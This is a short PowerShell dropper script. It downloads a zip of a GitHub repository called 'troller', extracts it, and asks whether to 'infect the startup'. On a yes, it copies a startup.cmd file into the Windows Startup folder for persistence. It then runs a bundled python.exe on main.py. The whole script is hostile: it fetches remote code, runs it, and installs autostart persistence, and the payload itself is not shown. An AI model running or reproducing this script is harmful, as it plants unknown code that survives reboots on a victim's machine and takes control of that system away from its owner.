Set-location -Path $HOME
cmd /C curl "https://codeload.github.com/boatinalamp/troller/zip/refs/heads/main" --output main.zip
cmd /C tar xf .\main.zip
Set-location -Path .\troller-main
$consent = Read-Host "Do you want to infect the startup? (y or n) "
If ($consent -eq 'y') {
Copy-Item -Path "$HOME\troller-main\startup.cmd" -Destination "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
}
Else {"Ran without injecting."}
.\python.exe main.py






